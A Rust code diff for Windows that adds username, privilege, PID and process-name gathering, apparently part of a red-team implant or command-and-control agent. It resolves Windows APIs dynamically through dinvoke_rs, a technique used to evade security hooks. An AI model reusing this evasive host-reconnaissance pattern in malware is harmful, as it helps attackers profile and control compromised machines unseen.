@@ -1,4 +1,5 @@
 extern crate windows_sys as windows;
+use dinvoke_rs::data::DWORD;
 use windows::Win32::System::SystemInformation::OSVERSIONINFOW;
 
 use winapi::{ctypes::c_void as winapi_void, shared::{minwindef::{BOOL, FARPROC, HMODULE}, ntdef::{BOOLEAN, HANDLE, STRING, UNICODE_STRING}}};
@@ -7,7 +8,7 @@ use windows::Win32::Networking::WinInet::{
     INTERNET_FLAG_RELOAD, INTERNET_OPEN_TYPE_DIRECT, INTERNET_SERVICE_HTTP,
 };
 
-use std::{ffi::{c_void, CString, OsStr}, mem, os::windows::ffi::OsStrExt, ptr::null_mut};
+use std::{ffi::{c_void, CString, OsStr, OsString}, mem, os::windows::ffi::{OsStrExt, OsStringExt}, ptr::null_mut};
 //use std::os::windows::ffi::OsStringExt;
 
 // Define RtlGetVersion function type
@@ -333,3 +334,77 @@ pub fn get_external_ip(ntdll: usize, kernel32: usize) -> String {
 
     ip
 } //http version
+
+pub fn get_username() -> String {
+    // Get the combined username and privileges
+    let full_string = whoami::get_username_ntapi().unwrap();
+
+    // Split the full string into a vector of strings
+    let parts: Vec<&str> = full_string.split('\n').collect();
+
+    // The first part is the username
+    let username = parts[1].to_string();
+
+    // Check if the user has admin privileges
+    if parts[1..]
+        .iter()
+        .any(|&s| s.trim_end_matches('\0') == "SeTakeOwnershipPrivilege")
+    {
+        // If the user has admin privileges, append an asterisk to the username
+        return format!("{}*", username);
+    }
+
+    username
+}
+
+pub fn get_pid() -> String {
+    std::process::id().to_string()
+}
+
+pub fn get_process_name(module_name: usize) -> String {
+    // Initialize a buffer to hold the process name.
+    let mut buffer: Vec<u16> = vec![0; 1024];
+
+    // Dynamically load the GetModuleFileNameW function from the kernel32.dll module.
+    //let module_name = ldr_get_dll("kernel32.dll");
+    // If get_function_address returns an Option<*const c_void>
+    let proc = match dinvoke_rs::dinvoke::get_function_address(module_name, "GetModuleFileNameW") {
+        0 => {
+            println!("Failed to get LoadLibraryA address");
+            return "Unknown".to_string();
+        },
+        addr => addr,
+    };
+
+        // Cast the address of the GetModuleFileNameW function to the appropriate function pointer type.
+        let get_module_filename_w: unsafe extern "system" fn(HMODULE, *mut u16, DWORD) -> DWORD =
+            unsafe { mem::transmute(proc) };
+
+        // Call the GetModuleFileNameW function to get the full path of the current process.
+        unsafe {
+            let result = get_module_filename_w(
+                0 as _, // Get the name of the current process.
+                buffer.as_mut_ptr(),
+                buffer.len() as u32,
+            );
+            // If the function call fails, panic.
+            if result == 0 {
+                panic!("Failed to get the module file name");
+            }
+        }
+
+        // Convert the buffer from wide characters to a string.
+        let process_full_path = OsString::from_wide(&buffer)
+            .into_string()
+            .unwrap_or_else(|_| String::new());
+
+        // Extract the process name from the full path by splitting the path on backslashes and taking the last component.
+        let process_name = process_full_path
+            .split("\\")
+            .last()
+            .unwrap_or(&process_full_path);
+
+        // Return the process name.
+        process_name.to_string()
+
+} //get_process_name
